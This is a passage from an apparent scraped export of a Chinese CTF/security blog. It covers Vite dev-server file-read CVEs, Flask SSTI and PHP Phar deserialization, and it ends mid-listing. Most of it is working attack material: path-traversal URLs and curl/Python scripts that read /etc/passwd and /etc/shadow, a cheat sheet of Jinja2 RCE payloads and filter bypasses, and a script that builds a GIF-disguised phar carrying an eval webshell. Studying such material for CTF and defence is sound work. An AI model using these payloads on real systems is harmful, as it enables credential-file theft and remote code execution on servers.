/@fs/etc/passwd?import\u0026amp;raw?? /@fs/tgflagggg?import\u0026amp;raw?? CVE-2025-31486 分析见Vite开发服务器任意文件读取漏洞分析复现（CVE-2025-31125）-先知社区\n这篇是低版本的poc\n1 /@fs/etc/passwd?import\u0026amp;?inline=1.wasm?init 新版poc\n1 2 3 /@fs/etc/passwd?import\u0026amp;?.svg?.wasm?init /@fs/etc/shadow?.svg?.wasm?init //这里没有import是因为读取的文件没有后缀，isJSRequest为true POC1\n仅影响Vite 6.0及以上版本（即\u0026gt;=6.0.0的受影响版本）； 仅当被读取的文件大小小于build.assetsInlineLimit配置值时（默认值为4KB） 1 /@fs/etc/passwd?.svg?.wasm?init POC2\n需要知道Vite所在的绝对路径\n1 2 # 这里的/x/x/x/vite-project/是指Vite所在的绝对路径 /@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import\u0026amp;?raw [TGCTF]前端GAME Plus 1 2 /@fs/etc/passwd?.svg?.wasm?init /@fs/tgflagggg?.svg?.wasm?init CVE-2025-32395 这下必须知道vite的绝对路径了\n先访问/@fs/tmp/,界面会返回如下\n1 2 3 4 5 6 403 Restricted The request url \u0026#34;/tmp\u0026#34; is outside of Vite serving allow list. - /root/pseudocat Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details. 这里的403页面会回显Vite的allow list，一般而言就是Vite所在的路径了\n1 curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173 1 2 # 这里的/x/x/x/vite-project/是指Vite所在的绝对路径 /@fs/x/x/x/vite-project/#/../../../../../etc/passwd 直接在浏览器没办法用#符号，在bp里面就能用了\n当然也可以使用Python，注意使用requests没法复现。可以使用http.client，它是Python标准库中提供的一个底层的HTTP客户端模块，直接与网络套接字交互来发送和接收HTTP请求和响应，能够实现类似curl --request-target的功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import http.client # 替换为实际的 IP 地址 ip = \u0026#39;xxx.xxx.xxx.xxx\u0026#39; # 替换为实际的 PORT 端口 port = 5173 # 定义请求目标路径 request_target = \u0026#39;/@fs/root/pseudocat/#/../../../../../etc/passwd\u0026#39; try: # 创建 HTTP 连接 conn = http.client.HTTPConnection(ip, port) # 发起 GET 请求 conn.request(\u0026#39;GET\u0026#39;, request_target) # 获取响应 response = conn.getresponse() # 读取响应内容 data = response.read().decode(\u0026#39;utf-8\u0026#39;) # 打印响应状态码和内容 print(f\u0026#34;状态码: {response.status}\u0026#34;) print(data) except http.client.HTTPException as http_err: print(f\u0026#34;HTTP 异常: {http_err}\u0026#34;) except Exception as e: print(f\u0026#34;发生其他错误: {e}\u0026#34;) finally: # 关闭连接 if conn: conn.close() [TGCTF]前端GAME Ultra /@fs/tmp读到/app\n用curl\n1 curl --request-target /@fs/app/#/../../../../../etc/passwd http://127.0.0.1:53349 1 curl --request-target /@fs/app/#/../../../../../tgflagggg http://127.0.0.1:53349 ","date":"2025-03-23T00:00:00Z","image":"https://0d000721999.github.io/p/vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","title":"Vite任意文件读取漏洞"},{"content":"SSTI(flask) 参考CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】 - 知乎\nFlask SSTI 题的基本思路就是利用 python 中的 魔术方法 找到自己要用的函数。\ndict：保存类实例或对象实例的属性变量键值对字典 class：返回调用的参数类型 mro：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 bases：返回类型列表 subclasses：返回object的子类 init：类的初始化方法 globals：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 base 和 mro 都是用来寻找基类的。\n基本流程 使用魔术方法进行函数解析，再获取基本类：\n1 2 3 4 5 \u0026#39;\u0026#39;.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] //针对jinjia2/flask为[9]适用 获取基本类后，继续向下获取基本类 object 的子类：\n1 object.__subclasses__() 找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：\n1 2 3 4 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[99].__init__ \u0026lt;slot wrapper \u0026#39;__init__\u0026#39; of \u0026#39;object\u0026#39; objects\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__ \u0026lt;unbound method WarningMessage.__init__\u0026gt; 查看其引用 __builtins__\nPython 程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于 builtins 却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块。\n1 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;] 这里会返回 dict 类型，寻找 keys 中可用函数，直接调用即可，使用 keys 中的 file 以实现读取文件的功能：\n1 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;file\u0026#39;](\u0026#39;F://GetFlag.txt\u0026#39;).read() 读写文件 读文件\n1 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;file\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).read() 写文件\n1 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;file\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).write() 存在的子模块可以通过 .index() 来进行查询，如果存在的话返回索引，直接调用即可。\n另外的写法\n1 [].__class__.__base__.__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read() 命令执行 eval执行 1 \u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;whoami\u0026#34;).read()\u0026#39;) warnings.catch_warnings 进行命令执行 首先，查看 warnings.catch_warnings 方法的位置：\n1 [].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 查看 linecatch 的位置：\n1 [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(\u0026#39;linecache\u0026#39;) 查找 os 模块的位置：\n1 [].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__.keys().index(\u0026#39;os\u0026#39;) 查找 system 方法的位置：\n1 [].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__.values()[12].__dict__.keys().index(\u0026#39;system\u0026#39;) 调用 system 方法：\n1 [].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__.values()[12].__dict__.values()[144](\u0026#39;whoami\u0026#39;) command命令执行 1 {}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;commands\u0026#39;).getstatusoutput(\u0026#39;ls\u0026#39;) 1 {}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;) 1 {}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read() 姿势集 config 1 2 3 4 {{config}} 可以获取当前设置，如果题目是这样的： app.config [\u0026#39;FLAG\u0026#39;] = os.environ.pop（\u0026#39;FLAG\u0026#39;） 可以直接访问 {{config[\u0026#39;FLAG\u0026#39;]}} 或者 {{config.FLAG}} 得到 flag 1 {{self.__dict__._TemplateReference__context.config}} []、() 1 {{[].__class__.__base__.__subclasses__()[68].__init__.__globals__[\u0026#39;os\u0026#39;].__dict__.environ[\u0026#39;FLAG\u0026#39;]}} 全局变量 url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等\n如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：\n1 2 3 4 5 {{url_for.__globals__[\u0026#39;current_app\u0026#39;].config.FLAG}} {{get_flashed_messages.__globals__[\u0026#39;current_app\u0026#39;].config.FLAG}} {{request.application.__self__._get_data_for_json.__globals__[\u0026#39;json\u0026#39;].JSONEncoder.default.__globals__[\u0026#39;current_app\u0026#39;].config[\u0026#39;FLAG\u0026#39;]}} {{url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}} {{get_flashed_messages.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}} 过滤了 []、. pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。\n1 \u0026#39;\u0026#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(\u0026#39;/etc/passwd\u0026#39;).read() 在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。\n若.也被过滤，使用原生 JinJa2 函数 |attr()\n即将 request.class 改成 request|attr(\u0026quot;class\u0026quot;)\n过滤__ 利用 request.args 的属性\n1 {{ \u0026#39;\u0026#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](\u0026#39;/etc/passwd\u0026#39;).read() }}?class=__class__\u0026amp;mro=__mro__\u0026amp;subclasses=__subclasses__ 将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。\nGET:\n1 {{ \u0026#39;\u0026#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](\u0026#39;/etc/passwd\u0026#39;).read() }} POST:\n1 class=__class__\u0026amp;mro=__mro__\u0026amp;subclasses=__subclasses__ 过滤\u0026quot;\u0026quot; request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。\n1 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}?path=/etc/passwd 一些关键字被过滤 base64编码绕过 用于__getattribute__使用实例访问属性时。\n例如，过滤掉 class 关键词\n1 {{[].__getattribute__(\u0026#39;X19jbGFzc19f\u0026#39;.decode(\u0026#39;base64\u0026#39;)).__base__.__subclasses__()[40](\u0026#34;/etc/passwd\u0026#34;).read()}} 字符串拼接绕过 1 2 {{[].__getattribute__(\u0026#39;__c\u0026#39;+\u0026#39;lass__\u0026#39;).__base__.__subclasses__()[40](\u0026#34;/etc/passwd\u0026#34;).read()}} {{[].__getattribute__([\u0026#39;__c\u0026#39;,\u0026#39;lass__\u0026#39;]|join).__base__.__subclasses__()[40]}} 查类脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import re # 将查找到的父类列表替换到data中 data = r\u0026#39;\u0026#39;\u0026#39; [\u0026lt;class \u0026#39;type\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;weakref\u0026#39;\u0026gt;, ......] \u0026#39;\u0026#39;\u0026#39; # 在这里添加可以利用的类，下面会介绍这些类的利用方法 userful_class = [\u0026#39;linecache\u0026#39;, \u0026#39;os._wrap_close\u0026#39;, \u0026#39;subprocess.Popen\u0026#39;, \u0026#39;warnings.catch_warnings\u0026#39;, \u0026#39;_frozen_importlib._ModuleLock\u0026#39;, \u0026#39;_frozen_importlib._DummyModuleLock\u0026#39;, \u0026#39;_frozen_importlib._ModuleLockManager\u0026#39;, \u0026#39;_frozen_importlib.ModuleSpec\u0026#39;] pattern = re.compile(r\u0026#34;\u0026#39;(.*?)\u0026#39;\u0026#34;) class_list = re.findall(pattern, data) for c in class_list: for i in userful_class: if i in c: print(str(class_list.index(c)) + \u0026#34;: \u0026#34; + c) 进阶办法 上面内置函数还是讲的不够清楚\nflask提供了两个内置的全局函数：url_for、get_flashed_messages，两个都有__globals__键；\njinja2一共有3个内置的全局函数：range、lipsum、dict，其中只有lipsum有__globals__键\nflask的内置函数只有flask的渲染方法render_template()和render_template_string()渲染时才可使用；\njinja2的内置函数无条件，flask和jinja2的渲染方法都可使用\n1 2 3 4 5 6 # flask {{get_flashed_messages.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;whoami\u0026#39;).read()}} {{url_for.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;whoami\u0026#39;).read()}} # jinja2 {{lipsum.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;whoami\u0026#39;).read()}} # 另外两个内置函数和正常逃逸一个思路 内置类 Undefined 在渲染().__class__.__base__.__subclasses__().c.__init__初始化一个类时，此处由于不存在c类理论上应该报错停止执行，但是实际上并不会停止执行，这是由于Jinja2内置了Undefined类型，渲染结果显示为``，所以看起来并不存在的c类实际上触发了内置的Undefined类型。\npayload\n1 2 a.__init__.__globals__.__builtins__.open(\u0026#34;C:\\Windows\\win.ini\u0026#34;).read() a.__init__.__globals__.__builtins__.eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;) bytes python3新增了bytes类，用于代表字符串，其fromhex()方法可以将十六进制转换为字符串。\n1 2 # \u0026#34;\u0026#34;[__class__] \u0026#34;\u0026#34;[\u0026#34;\u0026#34;.encode().fromhex(\u0026#34;5f5f636c6173735f5f\u0026#34;).decode()] bypass 1 2 3 4 5 # 字符串拼接 \u0026#34;\u0026#34;[\u0026#34;__cl\u0026#34;+\u0026#34;ass__\u0026#34;] \u0026#34;\u0026#34;[\u0026#34;__cl\u0026#34;\u0026#34;ass__\u0026#34;] # 字符串倒序 \u0026#34;\u0026#34;[\u0026#34;__ssalc__\u0026#34;[::-1]] 符号绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 绕过. \u0026#34;\u0026#34;[\u0026#39;__class__\u0026#39;] \u0026#39;\u0026#39;|attr(\u0026#39;__class__\u0026#39;) # 绕过[] __subclasses__().pop(40) == __subclasses__()[40] __subclasses__().__getitem__(40) == __subclasses__()[40] # 绕过\\{\\{ {%print()%} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls /\u0026#39;).read()\u0026#34;)}}{% endif %}{% endfor %} # 也可以使用 {% if ... %}1{% endif %} 配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）出来： {% if \u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(\u0026#39;ls /\u0026#39;) %}1{% endif %} # 也可以用 {%print(......)%} 的形式来代替 {{ ，如下： {%print(\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read())%} 编码绕过 1 2 3 4 5 6 7 # 以下皆为 \u0026#34;\u0026#34;[\u0026#34;__class__\u0026#34;] 等效形式 # 八进制 \u0026#34;\u0026#34;[\u0026#34;\\137\\137\\143\\154\\141\\163\\163\\137\\137\u0026#34;] # 十六进制 \u0026#34;\u0026#34;[\u0026#34;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\u0026#34;] # Unicode \u0026#34;\u0026#34;[\u0026#34;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f\u0026#34;] 通用绕过 1 {%print 123%} 先检测有ssti\n获取__globals__ 1 2 获取globals {%set globals=dict(globals=a)|join%}{%print globals%} 1 2 3 4 5 6 7 获取下划线 {%print lipsum|string|list%} 获取pop方法 我们知道从哪里获取下划线之后，但是要考虑如何使用索引值来获取，这时我们就想到了pop()方法。pop()方法可以通过传入列表元素的索引值将列表中的该元素删除并返回该元素的值。 {%set pop=dict(po=a,p=b)|join%}{%print pop%} 这样的话我们就可以获取到下划线了。 {%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%print xiahuaxian%} 1 2 获取下划线之后也就自然能获得__globals__。 {%set pop=dict(po=a,p=b)|join%}{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}{%set globals=dict(globals=a)|join%}{%print(xiahuaxian,xiahuaxian,globals,xiahuaxian,xiahuaxian)|join%} 获取os模块 1 2 获取os字符串 {%set shell=dict(o=a,s=b)|join%}{%print shell%} 1 2 3 获取get()方法 获取get，以便我们使用get()获取到os模块。 {%set get=dict(get=a)|join%}{%print get%} 1 2 3 4 5 6 {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set shell=dict(o=a,s=b)|join%} {%set get=dict(get=a)|join%} {%print (lipsum|attr(globals))|attr(get)(shell)%} 获取popen方法 1 {%set popen=dict(popen=a)|join%}{%print popen%} 1 2 3 4 5 6 7 {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set shell=dict(o=a,s=b)|join%} {%set get=dict(get=a)|join%} {%set popen=dict(popen=a)|join%} {%print (lipsum|attr(globals))|attr(get)(shell)|attr(popen)%} 执行shell命令 拼接shell命令我们需要使用chr函数，因为chr不是flask的函数，所以我们必须自己获取。\n1 (lipsum|attr(\u0026#34;__globals__\u0026#34;))|attr(\u0026#34;__builtins__\u0026#34;)|attr(get)(chr) 1 2 3 4 5 获取__builtins__ {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%} {%print builtins%} 1 2 3 4 5 6 7 8 9 获取chr {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set get=dict(get=a)|join%} {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%} {%set ch=dict(chr=a)|join%} {%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%} {%print char%} 我们以\u0026quot;cat /flag\u0026quot;命令为例。拼接命令\n1 2 3 4 5 6 7 8 9 {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set get=dict(get=a)|join%} {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%} {%set ch=dict(chr=a)|join%} {%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%} {%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%} {%print command%} 1 2 3 4 5 6 7 8 9 10 11 12 {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set get=dict(get=a)|join%} {%set shell=dict(o=a,s=b)|join%} {%set popen=dict(popen=a)|join%} {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%} {%set ch=dict(ch=a,r=b)|join%} {%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%} {%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%} {%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)%} {%print result%} 但是这里用的是popen,popen()方法执行的返回结果是一个file对象，我们需要在使用read()函数进行读取。\n1 2 3 4 5 6 7 8 9 10 11 12 13 {%set pop=dict(po=a,p=b)|join%} {%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%} {%set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join%} {%set get=dict(get=a)|join%} {%set shell=dict(o=a,s=b)|join%} {%set popen=dict(popen=a)|join%} {%set builtins=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join%} {%set ch=dict(ch=a,r=b)|join%} {%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%} {%set command=char(99)%2bchar(97)%2bchar(116)%2bchar(32)%2bchar(47)%2bchar(102)%2bchar(108)%2bchar(97)%2bchar(103)%} {%set read=dict(read=a)|join%} {%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%} {%print result%} ","date":"2025-03-19T00:00:00Z","image":"https://0d000721999.github.io/p/sstiflask/1.png","permalink":"https://0d000721999.github.io/p/sstiflask/","title":"SSTI(flask)"},{"content":"Phar反序列化 phar文件的构成 1.stub ：phar文件标识\n1 2 3 4 5 \u0026lt;?php Phar::mapPhar(); include \u0026#39;phar://phar.phar/index.php\u0026#39;; __HALT_COMPILER(); ?\u0026gt; 可以理解为一个标志，格式为xxx，前面内容不限，但必须以__HALT_COMPILER();?\u0026gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。\n2. a manifest describing the contents phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。\n3. the file contents 被压缩文件的内容。\n4. [optional] a signature for verifying Phar integrity (phar file format only) 签名，放在文件末尾，格式如下：\n我们利用的就是倒数第二行的这个\n先要把php.ini里面的phar.randonly设置修改成off\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php //一个类 class Test { public $testdata; public function test_it() { echo 1; } } //类的实例化对象 $obj = new Test(); //尝试删除phar.phar文件，防止已经存在的phar.phar文件阻止新的phar文件生成 @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($obj); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 就生成了phar.phar\n010查看\n将其分为四个部分，可以看到序列化的对象放在第二部分\n下面这个序列化对象跟直接序列化得出的结果一致\n注意到stub部分是可控的\n我们就可以利用它绕过文件上传限制，改变文件类型\n将phar伪造成其他格式的文件 前面我们刚刚说了，我们可以 phar 文件必须以__HALT_COMPILER();?\u0026gt;来结尾，那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。因此假设这里我们构造一个带有图片文件头部的 phar 文件。\n1 2 //设置stub $phar-\u0026gt;setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); 只有这里要改，此时文件MIME类型会为image/gif\n可以用include包含phar://phar.phar\n触发反序列化的文件操作函数 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：\n这里通过一个demo论证一下上述结论。仍然以上面的phar文件为例\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php class TestObject { public function __destruct() { echo $this-\u0026gt;data; echo \u0026#39;Destruct called\u0026#39;; } } $filename = \u0026#39;phar://phar.phar/test.txt\u0026#39;; file_get_contents($filename); ?\u0026gt; 这里可以看到已经反序列化成功触发__destruct方法并且读取了文件内容。 其他函数也是可以的，就不一一试了， 如果题目限制了，phar://不能出现在头几个字符。可以用Bzip / Gzip协议绕过。\n1 $filename = \u0026#39;compress.zlib://phar://phar.phar/test.txt\u0026#39;; 虽然会警告但仍会执行，它同样适用于compress.bzip2://。 当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了反序列化攻击面。\n其他伪协议配合phar伪协议 php://filter/read\n1 php://filter/read=convert.base64-encode/resource=phar://phar.txt php://filter/resource\n1 php://filter/resource=phar://phar.txt/test.txt compress.zlib://\n1 compress.zlib://phar://phar.txt/test.txt compress.bzip://\n要开Bzip / Gzip 扩展\n1 compress.bzip://phar://phar.txt/test.txt compress.bzip2://\n1 compress.bzip2://phar://phar.txt/test.txt 利用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php //一个类 class Test { public $testdata = \u0026#34;OK\u0026#34;; public function test_it() { echo $this-\u0026gt;testdata; } function __destruct() { echo $this-\u0026gt;testdata; } } file_exists(\u0026#39;phar://phar.phar\u0026#39;); ?\u0026gt; 以这个demo为例，我们想要变量覆盖testdata\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php //一个类 class Test { public $testdata = \u0026#34;OK\u0026#34;; public function test_it() { echo $this-\u0026gt;testdata; } function __destruct() { echo $this-\u0026gt;testdata; } } //类的实例化对象 $obj = new Test(); //修改可控变量内容 $obj-\u0026gt;testdata = \u0026#34;I need to change \u0026#39;OK\u0026#39; to \u0026#39;OoooooooK\u0026#39;\u0026#34;; //尝试删除phar.phar文件，防止已经存在的phar.phar文件阻止新的phar文件生成 @unlink(\u0026#34;phar.phar\u0026#34;); //生成phar时，文件的后缀名必须为phar $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); //设置stub $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //将自定义的meta-data存入manifest，这个是利用的重点 $phar-\u0026gt;setMetadata($obj); //添加要压缩的文件，这个文件可以不存在，但这句语句不能少 $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //签名自动计算 $phar-\u0026gt;stopBuffering(); ?\u0026gt; 结果成功覆盖\n例题1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php if(isset($_GET[\u0026#39;filename\u0026#39;])){ $filename=$_GET[\u0026#39;filename\u0026#39;]; class MyClass{ var $output=\u0026#39;echo \u0026#34;hahaha\u0026#34;\u0026#39;; function __destruct() { eval($this-\u0026gt;output); } } file_exists($filename); } else{ highlight_file(__FILE__); } 这题可以直接生成phar文件，利用文件上传功能，结合file_exists函数进行phar反序列化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php // phar.readonly无法通过该语句进行设置: init_set(\u0026#34;phar.readonly\u0026#34;,0); class MyClass{ var $output = \u0026#39;@eval($_GET[_]);\u0026#39;; } $o = new MyClass(); $filename = \u0026#39;poc.phar\u0026#39;;// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($o); $phar-\u0026gt;addFromString(\u0026#34;foo.txt\u0026#34;,\u0026#34;bar\u0026#34;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 生成完改后缀为gif，然后output就被覆盖成木马了\n例题2：[HITCON 2017]Baby^h Master PHP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 \u0026lt;?php $FLAG = create_function(\u0026#34;\u0026#34;, \u0026#39;die(`/read_flag`);\u0026#39;); $SECRET = `/read_secret`; $SANDBOX = \u0026#34;/var/www/data/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($SANDBOX); @chdir($SANDBOX); if (!isset($_COOKIE[\u0026#34;session-data\u0026#34;])) { $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(\u0026#34;sha1\u0026#34;, $data, $SECRET); setcookie(\u0026#34;session-data\u0026#34;, sprintf(\u0026#34;%s-----%s\u0026#34;, $data, $hmac)); } class User { public $avatar; function __construct($path) { $this-\u0026gt;avatar = $path; } } class Admin extends User { function __destruct() { $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(\u0026#34;function my_function_$random() {\u0026#34; . \u0026#34; global \\$FLAG; 